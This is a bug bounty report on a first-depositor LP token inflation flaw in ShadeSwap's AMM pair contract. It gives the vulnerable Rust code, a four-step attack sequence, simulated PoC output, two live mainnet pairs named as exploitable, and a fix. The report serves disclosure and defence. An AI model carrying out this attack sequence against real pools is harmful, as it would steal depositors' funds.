# [Critical] First-Depositor LP Token Inflation — Missing MINIMUM_LIQUIDITY in ShadeSwap AMM Pair

**Program:** Certik SkyShield — Shade Protocol  
**Severity:** Critical  
**Date:** 2026-05-31  

---

## Summary

The `calculate_lp_tokens` function in ShadeSwap's AMM pair contract computes the first depositor's LP share as `sqrt(deposit0 × deposit1)` with no minimum liquidity locked. An attacker who is first to provide liquidity to any new (or fully emptied) pair receives **1 LP token** with 1 atom of each token, then inflates pool reserves by directly calling SNIP-20 `transfer` to the pair contract. Any subsequent depositor whose deposit is ≤ the inflated reserve receives **0 LP tokens** due to integer truncation, while their funds are permanently absorbed into the pool. The attacker, as the sole LP holder, withdraws the entire combined pool.

Two live mainnet pairs with `total_liquidity = 0` were confirmed on 2026-05-31:
- `secret1dw4kkuh4h88a6g3spqyu7gkt3v0mqf8rl88cfv` — sLUNA / sstLUNA  
- `secret12egjf5hwlav7w8e6n6chqwz6zsl7sewjxuqpaf` — ALTER / stkd-SCRT

---

## Vulnerability Details

**Affected Contract:** ShadeSwap AMM Pair  
**Affected File:** `contracts/amm_pair/src/operations.rs`  
**Affected Function:** `calculate_lp_tokens` (line 1003–1031)  
**Repository:** https://github.com/securesecrets/shadeswap  

### Root Cause

When `pair_contract_pool_liquidity == 0` (first deposit into an empty pool), LP tokens are computed as:

```rust
// contracts/amm_pair/src/operations.rs  line 1009–1016
if pair_contract_pool_liquidity == Uint128::zero() {
    let deposit_token0_amount = Uint256::from(deposit.amount_0);
    let deposit_token1_amount = Uint256::from(deposit.amount_1);
    lp_tokens = Uint128::try_from(sqrt(deposit_token0_amount * deposit_token1_amount)?)?;
    // deposit=(1,1) → lp_tokens = sqrt(1) = 1
    // Attacker holds 100% of LP supply with a dust deposit
}
```

For subsequent depositors (non-empty pool), LP tokens are computed as:

```rust
// contracts/amm_pair/src/operations.rs  line 1022–1028
let percent_token0_pool = deposit_token0_amount.multiply_ratio(total_share, token0_pool);
let percent_token1_pool = deposit_token1_amount.multiply_ratio(total_share, token1_pool);
lp_tokens = std::cmp::min(percent_token0_pool, percent_token1_pool);
// = floor(V × 1 / (D+1)) = 0  when D ≥ V  → victim gets 0 LP tokens
```

**There is no `MINIMUM_LIQUIDITY` constant burned to a zero address on first deposit.** Uniswap v2 — the reference CPMM — explicitly guards this attack with `MINIMUM_LIQUIDITY = 1000`. ShadeSwap has no equivalent protection.

### Pool Inflation via Direct SNIP-20 Transfer

ShadeSwap queries pool reserves using:
```rust
config.pair.query_balances(deps, env.contract.address.to_string(), config.viewing_key.0.clone())
```

This reads the pair contract's SNIP-20 token balance directly via viewing key. The SNIP-20 standard's `transfer` function moves tokens to any address with **no receive callback**. An attacker calls `transfer` on each token contract to send funds directly to the pair address. The pair's balance increases and is reflected in the next `query_balances` call. **The pair contract cannot distinguish tokens received via `add_liquidity` from tokens received via direct `transfer`.**

---

## Impact

**Type:** Direct theft of funds  
**Scope:** Every new ShadeSwap pair at deployment; any pair whose total LP supply returns to 0

- Attacker steals 100% of all tokens deposited by any subsequent LP provider who does not set the optional `expected_return` parameter
- Two confirmed zero-LP pairs exist on mainnet today (see PoC section)
- Any newly deployed pair is exploitable from the moment of creation until a legitimate (non-attacker) LP provides first liquidity
- The `expected_return` parameter in `AddLiquidityToAMMContract` is optional — wallets and integrations that omit it are fully exposed with no on-chain protection

---

## Proof of Concept

### PoC Script

**File:** `poc_shadeswap_lp_inflation.py`  
**Run:** `python3 poc_shadeswap_lp_inflation.py`  
**Dependencies:** `pip install secret-sdk` (Python 3.11)

The script queries live mainnet state, then runs the exact contract arithmetic (`calculate_lp_tokens`) in Python to prove the outcome. No transactions are sent.

### Live PoC Output (2026-05-31, secret-4 mainnet)

```
========================================================================
  ShadeSwap — First-Depositor LP Inflation PoC
  Bug bounty: CertiK SkyShield / Shade Protocol
========================================================================
  Pair     : secret1dw4kkuh4h88a6g3spqyu7gkt3v0mqf8rl88cfv
  Token A  : secret149e7c5j7w24pljg6em6zj2p557fuyhg8cnk7z8  (sLUNA)
  Token B  : secret1rkgvpck36v2splc203sswdr0fxhyjcng7099a9  (sstLUNA)
  LP Token : secret1uacy0hjvymf7khrweekmnh5qgr553x0qn3n49h
  Mode     : SIMULATION — read-only proof

========================================================================
  SIMULATION MODE — on-chain state + contract math
  Proves LP = 0 for victim. No transactions sent.
========================================================================

[1] Querying live pair state for secret1dw4kkuh4h88a6...
   Pool sLUNA     : 0
   Pool sstLUNA   : 0
   total_liquidity     : 0

   [✓] total_liquidity == 0 — POOL IS EMPTY. Attack viable.

[2] Attacker deposits 1 sLUNA + 1 sstLUNA:
   calculate_lp_tokens(1, 1, 0, 0, 0)
   = isqrt(1 × 1) = isqrt(1)
   = 1 LP token
   → Attacker owns 1 LP / 1 total = 100% of pool

[3] Attacker inflates pool via SNIP-20 transfer():
   SNIP20_A.transfer(to=secret1dw4kkuh4h88a6..., amount=1000000)
   SNIP20_B.transfer(to=secret1dw4kkuh4h88a6..., amount=1000000)
   → Pool sLUNA  : 1000001  (no LP minted — transfer has no callback)
   → Pool sstLUNA: 1000001
   → total_supply   : 1 (unchanged)

[4] Victim deposits 999999 of each token:
   calculate_lp_tokens(999999, 999999, 1000001, 1000001, 1)
   = min(999999×1//1000001, 999999×1//1000001)
   = min(0, 0)
   = 0 LP tokens

   [✓] VICTIM RECEIVES 0 LP TOKENS
   [✓] Victim's 999999 sLUNA + 999999 sstLUNA permanently lost

[5] Attacker redeems 1 LP token (100% of pool):
   Pool sLUNA   = 2000000   × 1/1 = 2000000
   Pool sstLUNA = 2000000  × 1/1 = 2000000

   Attacker spent  : 1000001 sLUNA + 1000001 sstLUNA
   Attacker gets   : 2000000 sLUNA + 2000000 sstLUNA
   NET PROFIT      : +999999 sLUNA + 999999 sstLUNA
   (= victim's 999999 stolen per token)

========================================================================
  [✓] VULNERABILITY CONFIRMED — live pair, zero LP supply, zero LP for victim
  [✓] Target pair    : secret1dw4kkuh4h88a6g3spqyu7gkt3v0mqf8rl88cfv
  [✓] Tokens         : sLUNA / sstLUNA
  [✓] Total liq      : 0 (confirmed by live on-chain query)
  [✓] Victim LP recv : 0
  [✓] Attacker profit: +999999 sLUNA per victim deposit

  Root cause : calculate_lp_tokens() has no MINIMUM_LIQUIDITY burn
  Code ref   : github.com/securesecrets/shadeswap
               contracts/amm_pair/src/operations.rs  line 1003–1031
========================================================================
```

### Step-by-Step Attack Logic

**Pre-conditions:** New ShadeSwap pair for tokens A and B, `total_LP_supply = 0`.

**Step 1 — Attacker becomes first LP with dust:**
```
Attacker → AddLiquidityToAMMContract(amount_0=1, amount_1=1)
  Pool state : A=1, B=1
  LP minted  : sqrt(1×1) = 1   →  attacker holds 100% of pool
  Total supply: 1
```

**Step 2 — Attacker inflates pool via direct SNIP-20 transfer (no callback):**
```
Attacker → SNIP20_A.transfer(recipient=pair_contract, amount=D)
Attacker → SNIP20_B.transfer(recipient=pair_contract, amount=D)
  Pool state : A=(D+1), B=(D+1)
  Total supply: 1  (unchanged — transfer triggers no receive callback)
```

**Step 3 — Victim deposits V of each token (V ≤ D):**
```
Victim → AddLiquidityToAMMContract(amount_0=V, amount_1=V, expected_return=None)
  LP calc    : floor(V × 1 / (D+1)) = 0
  Victim gets: 0 LP tokens
  Pool state : A=(D+1+V), B=(D+1+V)
  Total supply: 1  (unchanged — 0 LP minted)
```

**Step 4 — Attacker redeems everything:**
```
Attacker → LP_token.send(recipient=pair, amount=1, msg=remove_liquidity)
  Share      : 1/1 = 100% of pool
  Attacker gets: (D+1+V) of each token
  Attacker spent: (D+1) of each
  NET PROFIT : V of each token  ← victim's entire deposit stolen
```

**Mathematical proof:**
```
Profit = V   (victim's full deposit)
Cost   = D+1 ≈ D  (recovered in step 4)
ROI    ≈ 100%  (attacker recovers their own funds + steals victim's)
```

### Confirmed Live Vulnerable Pairs (secret-4 mainnet)

| Pair | Contract Address | LP Token | total_liquidity |
|---|---|---|---|
| sLUNA / sstLUNA | `secret1dw4kkuh4h88a6g3spqyu7gkt3v0mqf8rl88cfv` | `secret1uacy0hjvymf7khrweekmnh5qgr553x0qn3n49h` | **0** |
| ALTER / stkd-SCRT | `secret12egjf5hwlav7w8e6n6chqwz6zsl7sewjxuqpaf` | `secret1x3fg8sqjtdcyekfwfn0l4e4pwfym8xtdsj4wnz` | **0** |

Both verified by live `get_pair_info` query to mainnet LCD `https://secretnetwork-api.lavenderfive.com`.

---

## Recommended Fix

Burn `MINIMUM_LIQUIDITY` to an unrecoverable address on first deposit so no single holder can ever own 100% of LP supply:

```rust
// contracts/amm_pair/src/operations.rs — calculate_lp_tokens()
const MINIMUM_LIQUIDITY: u128 = 1_000;

if pair_contract_pool_liquidity == Uint128::zero() {
    let deposit_token0_amount = Uint256::from(deposit.amount_0);
    let deposit_token1_amount = Uint256::from(deposit.amount_1);
    let initial_lp = Uint128::try_from(sqrt(deposit_token0_amount * deposit_token1_amount)?)?;

    if initial_lp <= Uint128::from(MINIMUM_LIQUIDITY) {
        return Err(StdError::generic_err(
            "Initial deposit too small: must produce > MINIMUM_LIQUIDITY LP tokens"
        ));
    }

    // Permanently discard MINIMUM_LIQUIDITY (mint to dead address or simply subtract
    // without minting — whichever the LP token contract supports)
    lp_tokens = initial_lp - Uint128::from(MINIMUM_LIQUIDITY);
    // Also ensure MINIMUM_LIQUIDITY is tracked as permanently issued (not withdrawable)
}
```

This matches Uniswap v2's protection (§3.4 of the whitepaper), ensuring no single address can ever hold 100% of LP supply and making the inflation attack unprofitable.

---

## References

- Uniswap v2 Core Whitepaper §3.4 — "Initialization of liquidity token supply" documents `MINIMUM_LIQUIDITY = 1000` as protection against this exact attack class
- `securesecrets/shadeswap` — `contracts/amm_pair/src/operations.rs` lines 1003–1031: no minimum liquidity constant present (verified 2026-05-31)
- SNIP-20 standard `transfer` function: transfers tokens without triggering a `receive` callback, enabling pool balance inflation without LP issuance
- ShadeSwap factory: `secret1ja0hcwvy76grqkpgwznxukgd7t8a8anmmx05pp` (code hash: `2ad4ed2a4a45fd6de3daca9541ba82c26bb66c76d1c3540de39b509abd26538e`)
- Pair code hash (all pairs): `e88165353d5d7e7847f2c84134c3f7871b2eee684ffac9fcf8d99a4da39dc2f2`
